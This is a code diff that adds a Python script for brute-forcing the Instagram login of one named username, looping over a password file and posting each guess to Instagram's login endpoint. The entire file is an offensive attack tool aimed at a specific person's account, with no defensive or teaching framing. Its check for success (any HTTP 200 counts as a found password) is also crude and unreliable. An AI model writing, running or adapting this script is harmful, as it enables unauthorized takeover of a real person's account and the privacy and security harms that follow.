@@ -1,0 +1,38 @@
+import requests
+
+# Define the target username and passwords list
+target_username = 'saloni3230'
+passwords_file = 'passwords.txt'
+
+# Read the passwords from the file
+with open(passwords_file, 'r') as file:
+    passwords = file.read().splitlines()
+
+# Instagram login URL
+login_url = 'https://www.instagram.com/accounts/login/ajax/'
+
+# Function to send a login request
+def login_request(username, password):
+    payload = {
+        'username': username,
+        'password': password,
+        'device_id': 'android-some_device_id',
+        'from_reg': 'false'
+    }
+    response = requests.post(login_url, data=payload)
+    return response
+
+# Main function to perform brute force attack
+def brute_force_attack():
+    for password in passwords:
+        response = login_request(target_username, password)
+        if response.status_code == 200:
+            print(f'[+] Password found: {password}')
+            return
+        else:
+            print(f'[-] Failed with password: {password}')
+    print('[!] No valid password found.')
+
+# Run the brute force attack
+if __name__ == '__main__':
+    brute_force_attack()
